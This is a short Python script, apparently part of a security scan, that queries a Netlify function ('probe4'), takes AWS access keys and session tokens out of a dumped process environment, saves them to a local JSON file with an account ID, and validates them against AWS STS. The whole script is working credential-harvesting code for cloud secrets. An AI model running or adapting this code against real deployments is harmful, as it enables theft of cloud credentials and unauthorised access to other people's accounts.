# -*- coding: utf-8 -*-
"""B site probe4 -> proc2 extension 新鲜凭据 -> sts 验证"""
import http.client, ssl, json, re, sys, subprocess
base = r'D:\scan\netlify_report'
ctx = ssl.create_default_context()

conn = http.client.HTTPSConnection('sec-b-08v4pk.netlify.app', context=ctx, timeout=90)
conn.request('GET', '/.netlify/functions/probe4', headers={'Accept': 'application/json'})
r = conn.getresponse()
raw = r.read()
st = r.status
conn.close()
print('status:', st, 'len:', len(raw))
if st != 200:
    print(raw[:400].decode('utf-8', 'replace'))
    sys.exit(1)

d = json.loads(raw.decode('utf-8', 'replace'))
env = d.get('proc2', {}).get('environ', '')
print('proc2 environ len:', len(env))
if not env:
    print('no proc2 environ; keys:', list(d.keys())[:20])
    sys.exit(1)

def grab(name):
    m = re.search(name + r'=([^|]+)', env)
    return m.group(1) if m else None

ak, sk, stk = grab('AWS_ACCESS_KEY_ID'), grab('AWS_SECRET_ACCESS_KEY'), grab('AWS_SESSION_TOKEN')
print('AK:', ak)
if not (ak and sk and stk):
    print('missing keys; environ head:', env[:300])
    sys.exit(1)

out = {'access_key': ak, 'secret_key': sk, 'session_token': stk,
       'account': '706019798846', 'region': 'us-east-2', 'source': 'proc2-ext-fresh-B-site'}
json.dump(out, open(base + r'\_aws_creds3.json', 'w'), indent=1)
print('saved fresh _aws_creds3.json')

# 立即 sts 验证
import boto3
from botocore.config import Config
cfg = Config(region_name='us-east-2', retries={'max_attempts': 1}, connect_timeout=8, read_timeout=10)
c = boto3.client('sts', aws_access_key_id=ak, aws_secret_access_key=sk, aws_session_token=stk, config=cfg)
try:
    r2 = c.get_caller_identity()
    print('STS ->', r2['Arn'], '| account', r2['Account'])
except Exception as e:
    print('STS ERR:', type(e).__name__, str(e)[:160])
